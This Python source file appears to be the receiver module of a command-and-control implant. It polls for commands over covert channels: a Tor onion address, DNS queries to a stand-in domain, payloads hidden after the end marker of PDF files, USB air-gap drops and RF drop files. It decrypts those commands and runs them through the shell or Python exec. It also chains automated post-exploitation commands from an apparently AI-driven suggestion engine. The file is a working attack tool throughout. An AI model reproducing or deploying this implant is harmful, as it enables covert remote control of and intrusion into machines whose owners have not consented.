#!/usr/bin/env python3
# Ruta: modules/c2/agent_receiver.py

import os
import json
import base64
import hashlib
import socket
import subprocess
import time
import requests
import importlib.util
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Hash import HMAC, SHA256
from Crypto.Util.Padding import unpad
import glob
import uuid
import re

try:
    import websockets
    import asyncio
except ImportError:
    websockets = None

AGENT_ID = socket.gethostname()
QUEUE_FILE = f"c2/queues/{AGENT_ID}.queue"
RESULTS_DIR = "results"
STIX_OUT = f"{RESULTS_DIR}/stix_exec_{AGENT_ID}.json"
EXEC_LOG = f"{RESULTS_DIR}/agent_exec_log_{AGENT_ID}.jsonl"
DASHBOARD_WS = "ws://localhost:8765"
KEY_ENV = "C2_AES_KEY"
HMAC_ENV = "C2_HMAC_KEY"
TOR_PROXY = "socks5h://127.0.0.1:9050"
TOR_URL = f"http://agentreceiver.onion/recv?agent={AGENT_ID}"
RF_DIR = f"/tmp/rf_dropzone/"
DNS_DOMAIN = "agentcmd.example.com"
PDF_DROP_DIR = "/var/dropzone/pdf/"
AIRGAP_DIR = "/mnt/usb/airgap/"
REVERSE_POLL_INTERVAL = 15
CHAIN_POSTEX = True
ALLOWED_MACS = []

os.makedirs("c2/queues", exist_ok=True)
os.makedirs(RESULTS_DIR, exist_ok=True)
os.makedirs(RF_DIR, exist_ok=True)
os.makedirs(PDF_DROP_DIR, exist_ok=True)

def get_mac():
    for iface in os.listdir('/sys/class/net'):
        try:
            with open(f'/sys/class/net/{iface}/address') as f:
                mac = f.read().strip()
                if mac and mac != "00:00:00:00:00:00":
                    return mac
        except:
            continue
    return "unknown"

def decrypt_command(payload, key, hmac_key=None):
    decoded = base64.b64decode(payload)
    iv = decoded[:16]
    ct = decoded[16:-32] if hmac_key else decoded[16:]
    hmac_val = decoded[-32:] if hmac_key else None

    if hmac_key:
        h = HMAC.new(hmac_key.encode(), digestmod=SHA256)
        h.update(iv + ct)
        h.verify(hmac_val)

    cipher = AES.new(hashlib.sha256(key.encode()).digest(), AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), AES.block_size).decode()

def execute_command(cmd):
    if cmd.startswith("run_module:"):
        path = cmd.split(":", 1)[1]
        if not os.path.isfile(path): return f"[ERR] No such module {path}"
        try:
            spec = importlib.util.spec_from_file_location("mod", path)
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            return mod.main() if hasattr(mod, "main") else "[ERR] No main()"
        except Exception as e:
            return f"[ERR] Module error: {e}"

    elif cmd.startswith("exec_py:"):
        try:
            local_vars = {}
            exec(cmd.split(":", 1)[1], {}, local_vars)
            return local_vars.get("output", "[+] Executed")
        except Exception as e:
            return f"[ERR] Python exec failed: {e}"

    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30).decode()
    except subprocess.CalledProcessError as e:
        return e.output.decode()
    except Exception as e:
        return str(e)

def log_execution(cmd, result):
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "agent_id": AGENT_ID,
        "mac": get_mac(),
        "command": cmd,
        "output": result
    }
    with open(EXEC_LOG, "a") as f:
        f.write(json.dumps(entry) + "\n")
    push_to_dashboard(entry)

def push_to_dashboard(entry):
    if not websockets: return
    async def send_msg():
        async with websockets.connect(DASHBOARD_WS) as ws:
            await ws.send(json.dumps({
                "type": "execution",
                "agent": AGENT_ID,
                "payload": entry
            }))
    try:
        asyncio.run(send_msg())
    except:
        pass

def export_stix(cmd, result):
    bundle = {
        "type": "bundle",
        "id": f"bundle--{uuid.uuid4()}",
        "objects": [{
            "type": "observed-data",
            "id": f"observed-data--{uuid.uuid4()}",
            "created": datetime.utcnow().isoformat(),
            "modified": datetime.utcnow().isoformat(),
            "number_observed": 1,
            "first_observed": datetime.utcnow().isoformat(),
            "last_observed": datetime.utcnow().isoformat(),
            "x_exec": {
                "agent": AGENT_ID,
                "command": cmd,
                "output": result
            }
        }]
    }
    with open(STIX_OUT, "w") as f:
        json.dump(bundle, f, indent=2)

def process_queue():
    if not os.path.exists(QUEUE_FILE): return
    with open(QUEUE_FILE, "r") as f:
        lines = f.readlines()
    os.remove(QUEUE_FILE)
    key = os.environ.get(KEY_ENV)
    hmac_key = os.environ.get(HMAC_ENV)
    mac = get_mac()
    if ALLOWED_MACS and mac not in ALLOWED_MACS: return

    for line in lines:
        cmd = line.strip()
        if key:
            try: cmd = decrypt_command(cmd, key, hmac_key)
            except: continue
        result = execute_command(cmd)
        log_execution(cmd, result)
        export_stix(cmd, result)
        if CHAIN_POSTEX: try_postex_chain(cmd, result)

def check_tor():
    try:
        r = requests.get(TOR_URL, proxies={"http": TOR_PROXY}, timeout=10)
        return r.text.strip() if r.status_code == 200 else None
    except:
        return None

def check_rf():
    f = os.path.join(RF_DIR, f"{AGENT_ID}.rf")
    if os.path.exists(f):
        with open(f, "r") as fd:
            cmd = fd.read().strip()
        os.remove(f)
        return cmd
    return None

def check_dns():
    try:
        fqdn = f"{AGENT_ID}.{DNS_DOMAIN}"
        ip = socket.gethostbyname(fqdn)
        if re.match(r"\d+\.\d+\.\d+\.\d+", ip):
            return base64.b64decode(ip.encode()).decode()
    except:
        return None

def check_pdf_stego():
    pdfs = glob.glob(f"{PDF_DROP_DIR}/*.pdf")
    for pdf in pdfs:
        try:
            with open(pdf, "rb") as f:
                content = f.read()
                marker = b"%EOF"
                if marker in content:
                    hidden = content.split(marker)[-1].strip()
                    os.remove(pdf)
                    return base64.b64decode(hidden).decode()
        except:
            continue
    return None

def check_airgap():
    cmds = glob.glob(f"{AIRGAP_DIR}/*.cmd")
    for cmdfile in cmds:
        try:
            with open(cmdfile, "r") as f:
                content = f.read().strip()
            os.remove(cmdfile)
            return content
        except:
            continue
    return None

def poll_reverse():
    key = os.environ.get(KEY_ENV)
    hmac_key = os.environ.get(HMAC_ENV)
    for method, fetcher in [
        ("tor", check_tor),
        ("rf", check_rf),
        ("dns", check_dns),
        ("pdf", check_pdf_stego),
        ("airgap", check_airgap)
    ]:
        raw = fetcher()
        if raw:
            try:
                cmd = decrypt_command(raw, key, hmac_key) if key else raw
                result = execute_command(cmd)
                log_execution(cmd, result)
                export_stix(cmd, result)
                if CHAIN_POSTEX: try_postex_chain(cmd, result)
            except:
                continue

def try_postex_chain(cmd, output):
    try:
        import copilot.suggestion_engine as se
        suggestions = se.suggest_next(cmd, output)
        for s in suggestions:
            result = execute_command(s)
            log_execution(s, result)
    except:
        pass

def main_loop():
    print(f"[+] Agent receiver running: {AGENT_ID}")
    while True:
        process_queue()
        poll_reverse()
        time.sleep(REVERSE_POLL_INTERVAL)

if __name__ == "__main__":
    main_loop()
